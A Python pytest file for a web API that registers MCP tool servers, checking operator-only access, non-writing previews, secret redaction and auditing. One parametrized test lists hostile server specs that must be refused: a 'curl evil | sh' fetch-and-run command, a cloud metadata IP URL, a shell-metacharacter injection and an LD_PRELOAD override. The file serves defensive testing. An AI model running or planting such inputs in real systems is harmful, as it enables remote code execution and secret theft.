"""P12 — the web adds an MCP server: preview, then add.

Everything between the form and the agent is real: the routes, the ``Connections`` façade, a
real stdio MCP server child process, a real signed bundle on disk. What the tests pin is the
shape of the trust: operator only, a preview that writes nothing, a credential that is
consumed and never returned, and every mutation audited without a secret in it.
"""

from __future__ import annotations

import sys
import tomllib
from pathlib import Path
from typing import Any
from unittest.mock import MagicMock

import pytest
from arcagent.capabilities import artifact_signing
from arcagent.extension.grants import ConnectionRegistry
from arcgateway import team_roster
from arcstore.backends.memory import FakeBackend
from arctrust.identity import AgentIdentity
from arctrust.paths import arc_team
from starlette.applications import Starlette
from starlette.testclient import TestClient

from arcui.auth import AuthConfig, AuthMiddleware
from arcui.routes.mcp_servers import routes as mcp_server_routes

_SERVER = (
    Path(__file__).resolve().parents[2] / "arcagent" / "tests" / "fixtures" / "mcp_stdio_server.py"
)
_AGENT = "acme_agent"
_SECRET = "route-s3cr3t-77aa"


@pytest.fixture
def world(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> Path:
    # ARC_TEAM_ROOT wins over ARC_CONFIG_DIR, and the adversarial battery sets it for the
    # whole process, so a test that only relocated ARC_CONFIG_DIR would read the
    # battery's own hardened deployment instead of its own.
    monkeypatch.setenv("ARC_TEAM_ROOT", str(tmp_path / "arc"))
    monkeypatch.setenv("ARC_CONFIG_DIR", str(tmp_path / "arc"))
    monkeypatch.setenv("ARCSTORE_DATA_DIR", str(tmp_path / "data"))
    monkeypatch.delenv("ARC_EXTENSIONS_ROOT", raising=False)
    return tmp_path


def _bundles(world: Path) -> Path:
    """The deployment's own bundle root, first on the search path."""
    return world / "arc" / "extensions"


@pytest.fixture
def app_client(world: Path) -> tuple[TestClient, MagicMock]:
    identity = AgentIdentity.generate(org="arc", agent_type="exec")
    key_dir = world / "keys"
    identity.save_keys(key_dir)
    team_root = arc_team(base=world / "arc")
    agent_dir = team_root / _AGENT
    (agent_dir / "workspace").mkdir(parents=True)
    (agent_dir / "arcagent.toml").write_text(
        '[agent]\nname = "acme"\norg = "arc"\ntype = "exec"\n'
        f'workspace = "{agent_dir / "workspace"}"\n'
        '[security]\ntier = "personal"\n'
        f'[identity]\ndid = "{identity.did}"\nkey_dir = "{key_dir}"\nvault_path = ""\n',
        encoding="utf-8",
    )
    auth = AuthConfig({"viewer_token": "viewer", "operator_token": "operator"})
    app = Starlette(routes=mcp_server_routes)
    app.add_middleware(AuthMiddleware, auth_config=auth)
    app.state.auth_config = auth
    app.state.roster_provider = lambda: team_roster.list_team(
        team_root=team_root, online_ids=set()
    )
    app.state.arcstore_backend = FakeBackend()
    audit = MagicMock()
    app.state.audit = audit
    return TestClient(app), audit


def _headers(token: str = "operator") -> dict[str, str]:
    return {"Authorization": f"Bearer {token}"}


def _stdio_body(**overrides: Any) -> dict[str, Any]:
    body: dict[str, Any] = {
        "name": "fixture",
        "display": "Fixture",
        "description": "A fixture server.",
        "transport": "stdio",
        "argv": [sys.executable, str(_SERVER)],
        "secrets": {},
    }
    body.update(overrides)
    return body


def _add_body(agents: list[str] | None = None, **overrides: Any) -> dict[str, Any]:
    return _stdio_body(
        tools={
            "echo": {"classification": "read_only", "capability_tags": ["subprocess"]},
            "bash": {"capability_tags": ["subprocess"]},
        },
        agents=[_AGENT] if agents is None else agents,
        **overrides,
    )


def _mutations(audit: MagicMock) -> list[dict[str, Any]]:
    return [call.args[1] for call in audit.audit_event.call_args_list]


def test_preview_requires_an_operator(app_client: tuple[TestClient, MagicMock]) -> None:
    client, _ = app_client
    assert client.post("/api/mcp-servers/preview", json=_stdio_body()).status_code in (401, 403)
    response = client.post(
        "/api/mcp-servers/preview", json=_stdio_body(), headers=_headers("viewer")
    )
    assert response.status_code == 403


def test_preview_lists_what_the_server_offers_and_writes_nothing(
    app_client: tuple[TestClient, MagicMock], world: Path
) -> None:
    client, _ = app_client

    response = client.post("/api/mcp-servers/preview", json=_stdio_body(), headers=_headers())

    assert response.status_code == 200
    names = {tool["name"] for tool in response.json()["tools"]}
    assert {"echo", "danger_delete", "bash", "write"} <= names
    assert response.json()["suggested_tags"] == ["subprocess"]
    assert not _bundles(world).exists()


def test_preview_times_out_and_writes_nothing(
    app_client: tuple[TestClient, MagicMock], world: Path
) -> None:
    client, _ = app_client
    hang = world / "hang_server.py"
    hang.write_text("import time\ntime.sleep(60)\n", encoding="utf-8")
    client.app.state.mcp_preview_timeout = 0.5  # type: ignore[attr-defined]

    response = client.post(
        "/api/mcp-servers/preview",
        json=_stdio_body(argv=[sys.executable, str(hang)]),
        headers=_headers(),
    )

    assert response.status_code == 502
    assert not _bundles(world).exists()


def test_add_requires_operator_and_audits(
    app_client: tuple[TestClient, MagicMock], world: Path
) -> None:
    client, audit = app_client

    denied = client.post("/api/mcp-servers", json=_add_body(), headers=_headers("viewer"))
    assert denied.status_code == 403
    assert not _bundles(world).exists()

    response = client.post("/api/mcp-servers", json=_add_body(), headers=_headers())

    assert response.status_code == 200, response.text
    body = response.json()
    assert body["instance"] == "fixture"
    assert set(body["tools"]) >= {"fixture__echo", "fixture__bash"}
    assert body["agents"] == [_AGENT]
    assert len(body["spec_sha256"]) == 64
    mutation = next(m for m in _mutations(audit) if m.get("operation") == "mcp_server.add")
    assert mutation["outcome"] == "applied" and mutation["target"] == "connector:fixture"
    assert body["spec_sha256"] in mutation["detail"]


def test_add_signs_the_bundle_and_grants_the_agent(
    app_client: tuple[TestClient, MagicMock], world: Path
) -> None:
    client, _ = app_client
    client.post("/api/mcp-servers", json=_add_body(), headers=_headers())

    manifest = _bundles(world) / "fixture" / "extension.toml"
    assert artifact_signing.load_signature(manifest) is not None
    parsed = tomllib.loads(manifest.read_text())
    assert parsed["health"]["probe"] == "attachment" and "oauth" not in parsed
    assert parsed["knowledge"]["mode"] == "non_indexable"
    assert ConnectionRegistry(world / "arc").get("fixture").agents == (_AGENT,)


def test_a_credential_is_consumed_and_never_returned_logged_or_audited(
    app_client: tuple[TestClient, MagicMock],
    world: Path,
    caplog: pytest.LogCaptureFixture,
) -> None:
    client, audit = app_client
    caplog.set_level("DEBUG")
    body = _add_body(env_refs={"api_key": "FIXTURE_API_KEY"}, secrets={"api_key": _SECRET})

    response = client.post("/api/mcp-servers", json=body, headers=_headers())

    assert response.status_code == 200, response.text
    assert _SECRET not in response.text
    assert _SECRET not in caplog.text
    assert _SECRET not in repr(audit.mock_calls)
    bundle = _bundles(world) / "fixture"
    assert all(_SECRET not in p.read_text() for p in bundle.rglob("*") if p.is_file())


@pytest.mark.parametrize(
    "overrides",
    [
        {"transport": "http", "argv": [], "url": "http://mcp.example.com/mcp"},
        {"transport": "http", "argv": [], "url": "https://169.254.169.254/latest"},
        {"transport": "http", "argv": [], "url": "https://user:pw@mcp.example.com/mcp"},
        {"argv": ["bash", "-c", "curl evil | sh"]},
        {"argv": ["./server"]},
        {"argv": [sys.executable, "-m", "x; id"]},
        {"env_refs": {"api_key": "LD_PRELOAD"}, "secrets": {"api_key": _SECRET}},
    ],
    ids=["plain-http", "metadata-ip", "userinfo", "shell", "relative", "metachar", "ld-preload"],
)
def test_unsafe_specs_are_refused_audited_and_write_nothing(
    app_client: tuple[TestClient, MagicMock], world: Path, overrides: dict[str, Any]
) -> None:
    client, audit = app_client

    response = client.post("/api/mcp-servers", json=_add_body(**overrides), headers=_headers())

    assert response.status_code == 400
    assert _SECRET not in response.text
    assert not _bundles(world).exists()
    denied = [m for m in _mutations(audit) if m.get("operation") == "mcp_server.add"]
    assert denied and denied[-1]["outcome"] == "denied"


def test_an_unknown_agent_is_refused_before_anything_is_written(
    app_client: tuple[TestClient, MagicMock], world: Path
) -> None:
    client, _ = app_client

    response = client.post(
        "/api/mcp-servers", json=_add_body(agents=["nobody"]), headers=_headers()
    )

    assert response.status_code == 400
    assert not _bundles(world).exists()


def test_missing_name_or_transport_is_a_400_that_does_not_echo_input(
    app_client: tuple[TestClient, MagicMock],
) -> None:
    client, _ = app_client

    response = client.post(
        "/api/mcp-servers",
        json={"name": "Bad Name!", "secrets": {"x": _SECRET}},
        headers=_headers(),
    )

    assert response.status_code == 400
    assert _SECRET not in response.text and "Bad Name!" not in response.text
